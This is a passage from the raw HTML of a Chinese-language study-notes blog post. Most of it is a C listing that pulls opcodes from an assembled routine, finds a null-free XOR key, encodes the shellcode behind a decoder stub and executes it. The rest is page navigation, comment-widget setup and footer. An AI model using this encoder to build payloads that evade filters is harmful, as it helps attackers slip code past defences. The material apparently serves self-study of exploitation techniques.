class="number">8</span>);   <span class="comment">// start of the ShellCode</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;MAX_OPCODE_LEN;i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>((<span class="type">unsigned</span> <span class="type">char</span>  *)(funPtr+i),fnend_str, <span class="number">8</span>)==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sh_len=i; <span class="comment">// length of the ShellCode</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Opcode_buff, (<span class="type">unsigned</span> <span class="type">char</span>  *)funPtr, sh_len);</span><br><span class="line">    <span class="keyword">return</span> sh_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">findXorByte</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> Buff[], <span class="type">int</span> buf_len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> xorByte=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0xff</span>; i&gt;<span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        k=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;buf_len;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((Buff[j]^i)==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                k++;<span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">0</span>)</span><br><span class="line">        &#123;<span class="comment">//find the xor byte</span></span><br><span class="line">            xorByte=i; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> xorByte;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">GetShellcode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>  opcode_Buff[MAX_OPCODE_LEN];</span><br><span class="line">    <span class="type">char</span> shellcode[MAX_OPCODE_LEN];</span><br><span class="line">    <span class="type">int</span> opcode_len=<span class="number">0</span>,encode_len,i,decode_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Enc_key;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> lPtr;</span><br><span class="line">    <span class="comment">// 获得原始的二进制代码</span></span><br><span class="line">    lPtr = doCommandLineAsm() ;</span><br><span class="line">    opcode_len=GetProcOpcode((<span class="type">unsigned</span> <span class="type">char</span> *)lPtr, opcode_Buff);</span><br><span class="line">    PrintStrCode(opcode_Buff, opcode_len);</span><br><span class="line">    <span class="comment">//doShellcode((char *)opcode_Buff);</span></span><br><span class="line">    <span class="comment">//return 0;</span></span><br><span class="line">    <span class="comment">// 找到XOR字节并编码shellcode</span></span><br><span class="line">    Enc_key = findXorByte(opcode_Buff, opcode_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\tXorByte=0x%.2x\n&quot;</span>, Enc_key);</span><br><span class="line">    encode_len=EncOpcode(opcode_Buff, opcode_len, Enc_key);</span><br><span class="line">    PrintStrCode(opcode_Buff, opcode_len);</span><br><span class="line">    <span class="keyword">if</span>(encode_len==<span class="built_in">strlen</span>((<span class="type">char</span> *)opcode_Buff))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\tSuccess: encode is OK\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;\tFail: encode is OK\n&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="comment">//return 0;</span></span><br><span class="line">    <span class="comment">// 加上解码程序</span></span><br><span class="line">    <span class="keyword">if</span>(encode_len&lt;<span class="number">256</span>)&#123;<span class="comment">// strlen(opcode_Buff)&lt;256，用decode1解码</span></span><br><span class="line">        decode_len = <span class="built_in">strlen</span>(decode1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;decode_len;i++)&#123;</span><br><span class="line">            shellcode[i]=decode1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        shellcode[<span class="number">8</span>]=encode_len;</span><br><span class="line">        shellcode[<span class="number">12</span>]=Enc_key;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;encode_len;i++)&#123;</span><br><span class="line">            shellcode[i+decode_len]=opcode_Buff[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">// strlen(opcode_Buff)&gt;=256，用decode2解码</span></span><br><span class="line">        decode_len = <span class="built_in">strlen</span>(decode2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;decode_len;i++)&#123;</span><br><span class="line">            shellcode[i]=decode2[i];</span><br><span class="line">        &#125;</span><br><span class="line">        shellcode[<span class="number">9</span>] =encode_len % <span class="number">0x100</span>;</span><br><span class="line">        shellcode[<span class="number">10</span>]=encode_len/<span class="number">0x100</span>;</span><br><span class="line">        shellcode[<span class="number">14</span>]=Enc_key;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;encode_len;i++)&#123;</span><br><span class="line">            shellcode[i+decode_len]=opcode_Buff[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nlength of shellcode = %d = 0x%x\n&quot;</span>,<span class="built_in">strlen</span>(shellcode),<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    PrintStrCode((<span class="type">unsigned</span> <span class="type">char</span>*)shellcode, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    </span><br><span class="line">    doShellcode(shellcode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lPtr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    GetShellcode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/2022/12/02/pyc-analyze/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2022/11/29/win32-shellcode/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>


	<!-- comment -->
	
<section id="comment">
    <h2 class="title">留言</h2>

    <!-- 
    <div id="disqus_thread" class="ds-thread">
        <script type="text/javascript">
            /**
             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
             */
                /*
                 var disqus_config = function () {
                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                 };
                 */
            (function() { // DON'T EDIT BELOW THIS LINE
                var d = document, s = d.createElement('script');

                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';

                s.setAttribute('data-timestamp', +new Date());
                (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
                Disqus.</a></noscript>
    </div> -->
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
        })
    </script>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2022-11-30 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/study-notes/">study-notes<span>17</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>

	<!-- copyright -->
	<div>
    <ul class="post-copyright">
      <li class="post-copyright-author">
      <strong>作者:  </strong>wd-z711</a>
      </li>
      <li class="post-copyright-link">
      <strong>文章链接:  </strong>
      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
      </li>
      <li class="post-copyright-license">
        <strong>版权声明:   </strong>
        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
        许可协议。转载请注明出处!
      </li>
    </ul>
  <div>
 	

		


</div><!-- row -->




	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2023 wd-z711
  
      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->

     <!-- <script type="text/javascript">
      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
      
      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
    </script> -->
    </p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
